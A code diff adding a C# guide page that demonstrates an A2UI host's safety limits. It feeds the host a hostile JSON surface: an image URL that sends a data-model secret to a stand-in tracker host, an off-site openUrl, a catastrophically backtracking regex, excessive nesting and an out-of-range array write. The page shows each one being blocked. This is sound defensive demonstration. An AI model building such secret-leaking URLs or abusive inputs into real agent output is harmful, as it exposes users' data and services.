@@ -514,4 +514,64 @@ expression that could backtrack catastrophically (`(a+)+$`, rejected by the A2UI
 
         public HTMLElement Render() => _content.Render();
     }
+
+    [SampleDetails(Group = "Guides", Order = 70, Icon = UIcons.Shield)]
+    public class SafetySample : IComponent, ISample
+    {
+        private readonly IComponent _content;
+
+        public SafetySample()
+        {
+            // Limits far below the defaults, so a few lines of JSON reach them.
+            var host = new A2UIHost().AllowHosts(new[] { "images.example.com" });
+            host.Limits.MaxTemplateItems  = 5;
+            host.Limits.MaxComponentDepth = 6;
+            host.Limits.MaxArrayGap       = 100;
+
+            var inspector = new Inspector(host);
+
+            const string pixel = "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7";
+
+            var send = Button("Send what the host keeps out").Primary().SetIcon(UIcons.Shield).OnClick(() =>
+            {
+                host.Clear();
+                inspector.Reset();
+                host.Process(J(@"[
+                  {'version':'1.0','createSurface':{'surfaceId':'safe','catalogId':'" + BASIC + @"',
+                    'dataModel':{'secret':'s3cret','rows':[{'n':'one'},{'n':'two'},{'n':'three'},{'n':'four'},{'n':'five'},{'n':'six'},{'n':'seven'},{'n':'eight'}],'long':'" + new string('a', 200) + @"'},
+                    'components':[
+                    {'id':'root','component':'Column','children':['ok','inline','leak','open','field','list','deep1']},
+                    {'id':'ok','component':'Text','text':'This surface still works'},
+                    {'id':'inline','component':'Image','variant':'icon','description':'inline picture','url':'" + pixel + @"'},
+                    {'id':'leak','component':'Image','description':'picture on another host','url':{'@call':'formatString','args':{'value':'https://tracker.example/p.png?d=${/secret}'}}},
+                    {'id':'open','component':'Button','child':'openLabel','action':{'functionCall':{'@call':'openUrl','args':{'url':'https://elsewhere.example/'}}}},
+                    {'id':'openLabel','component':'Text','text':'Open another site'},
+                    {'id':'field','component':'TextField','label':'Checked against a*a*a*a*a*c','value':{'@path':'/long'},'@checks':[{'condition':{'@call':'regex','args':{'value':{'@path':'/long'},'pattern':'a*a*a*a*a*c'}},'message':'Does not match'}]},
+                    {'id':'list','component':'Column','children':{'componentId':'row','path':'/rows'}},
+                    {'id':'row','component':'Text','text':{'@path':'n'}},
+                    {'id':'deep1','component':'Card','child':'deep2'},
+                    {'id':'deep2','component':'Card','child':'deep3'},
+                    {'id':'deep3','component':'Card','child':'deep4'},
+                    {'id':'deep4','component':'Card','child':'deep5'},
+                    {'id':'deep5','component':'Card','child':'deep6'},
+                    {'id':'deep6','component':'Card','child':'deep7'},
+                    {'id':'deep7','component':'Card','child':'deep8'},
+                    {'id':'deep8','component':'Text','text':'too deep to draw'}
+                  ]}},
+                  {'version':'1.0','updateDataModel':{'surfaceId':'safe','path':'/rows/2000000000/n','value':'far away'}}
+                ]"));
+            });
+
+            _content = Guide.Page("Safety", UIcons.Shield, "What an agent may reach, and how much it may ask for", "GuideSamples.cs",
+@"An agent writes every URL a surface carries, and a URL can hold anything the agent read from the data model. `host.AllowHosts(...)` (or `ContentSources`, a Tesserae
+`MarkdownContentSources`) keeps `Image`, `Video`, `AudioPlayer`, a `Mermaid` diagram, a `FlintChart` and `openUrl` to the page's own origin and the hosts the application lists;
+by default every host is allowed, as the protocol describes. `host.Limits` bounds what one host holds (components, template items, nesting, how far past its end an
+array is written), with defaults far above real use. This page lowers them so a few lines reach them: the picture on another host is not loaded, the button opens nothing,
+the list stops at five rows, the eighth nested card is a notice, and the write to index 2000000000 is refused. A pattern whose repeats multiply (`a*a*a*a*a*c`) is tested
+only against a short value. Each is an entry in the **Errors** tab, and the surface still works.",
+                send, Guide.Live(host, inspector));
+        }
+
+        public HTMLElement Render() => _content.Render();
+    }
 }
